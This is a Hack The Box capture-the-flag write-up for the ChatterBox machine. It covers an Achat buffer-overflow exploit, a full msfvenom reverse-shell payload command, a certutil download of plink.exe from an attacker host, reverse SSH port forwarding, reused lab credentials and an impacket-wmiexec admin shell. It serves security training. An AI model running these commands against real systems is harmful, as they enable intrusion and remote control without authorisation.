# ChatterBox [HTB](https://app.hackthebox.com/machines/Chatterbox)
![chatterbox-01]()



## Recon

Lets enumerate the machine with `nmap`:

`nmap -sC -sV -A 10.129.214.7 -oN nmap.result`


![nmap-res-02]()


We
We get the following ports:

+ RPC endpoint-mapper on port 135.
+ SMB on port  445.
+ NetBIOS on port 139.
+ HTTP on port 9255.
+ Custom RCP service on port 9256.
+ Other RPC endpoint on 49152-49157.


We can also see the target is probably a Windows 7 system. 
Lets start by taking a look at the SMB and RPC endpoints and see if we can snatch any quick 
wins there. 



### SMB


Altough we can login anonymously to the IPC$ share with `smbclient -U "%" -N \\\\10.129.214.7\\IPC$`:

![ipc-connect-03]()


We cant do anything inside: 

![ipc-fail-04]()


If we check the SMB version with msf's `scanner/smb/smb_version`, well see that the target 
is running SMB v2.1: 

![msf-res-05]



SMB v2.1, should be vulnerable to `Eternal-Blue`, but after a quick check our target is not:
`scanner/smb/smb_ms17_010`

![eb-res-06]()
 

At the moment, SMB doesnt look like the way forward, `enum4linux` yields nothing meaningful, 
and it seems that the SMB is tightly guarded. 

Lets move on to check the HTTP and the custom RPC port. 



### Achat


Trying to open the following URL `http://10.129.214.7:9255/`, quickly fails, nothing happens, 
no error message or redirects. Adding the hostname to our `/etc/hosts` doenst help. 


If we open Burp, we can see we are getting a `204 No-Content` replay: 

![204-replay-07]()



At first i thought Achat was a custom service tailored for this box specifically. But after
a quick goolge search i came to find out i was worng. Apparently its an open-source anonymous chat
application, and it has a [github](https://github.com/0301yasiru/aChat).


A quick goolge search also leads to [this](https://tenaka.gitbook.io/pentesting/boxes/achat) page.
Apparently, Achat is vulnerable to a buffer-overflow attack, and we have the exploit ready on 
our Kali machine in `/usr/share/exploitdb/exploits/windows/remote/36025.py`. 


Here is the exploit breakdown: 

copy the exploit to our CWD `cp /usr/share/exploitdb/exploits/windows/remote/36025.py achat.py`

update the shellcode with the following `msfvenom` command:

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=<myip> lport=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Take the output, and replace the `buf` varaible in the exploit with it.
Finally, change the target IP in the exploit:

![target-exp-08]()


Start the listener: `nc -lnvp 4444`


Execute the exploit `./achat.py`


Get a shell: 

![shell-09]()


## Privilege Escalation


After running a few basic commands from [sushant](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)'s cheat sheet, i found something interesting. 

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`


![pass-10]()


If we list out our open ports on the machine with `netstat -ano` we can see the following: 


![netstat-11]()


We have all these ports running on the localhost. nmap did manage to detect them for some 
reason. Now that we have credetials however, we could try to get access to them. But since they 
are running on the localhost, we need to setup port forwarding to our attack machine. 

For this we need [plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html),
Download the 32-bit version to your attack machine.

Start a python server `python3 -m http.server 8888`

Download it to the target with `certutil -urlcache -f http://10.10.14.21:8888/plink.exe plink.exe`

![transfer-12]()


Now we need to change two things in the `/etc/sshd/sshd_config` file on our kali:
First, permit root logins: 

![ssh-mod-13]()

Second, change the deafult port to 2222:

![ssh-mod-14]()


This is necessary beacuse HTB's firewalls block port 22. 
Finally start the ssh service with `service ssh start`.

Now we can run the port forwarding on the target machine with:
`plink.exe -l root -pw <pass> -R 445:127.0.0.0.1:445 10.10.14.68 -P 2222`


![plink-15]()


On our Kali machine we can check the status of port 445 with `netstat -ao | grep 445`:


![445-status-16]()


We can now start connecting to the SMB on the target through our localhost. 
Lets try logging in to the Admin$ share with `smbclient -U 'Alfred%Welcome1!' //127.0.0.1/Admin$`

![admin-fail-17]()


This fails, says we dont have access. What if we tried to use the same password with the 
Administrator account, after all Alfred and Administrator are the only two users on the machine.
And weve only found this one password in our enumeration, worth a shot. 


![admin-success-18]()



That's it, they use the same password. From here we can use `wmiexec` to pop a shell as the admin. 
`impacket-wmiexec Administrator:Welcome1\!@10.129.151.176`


![root-19]()
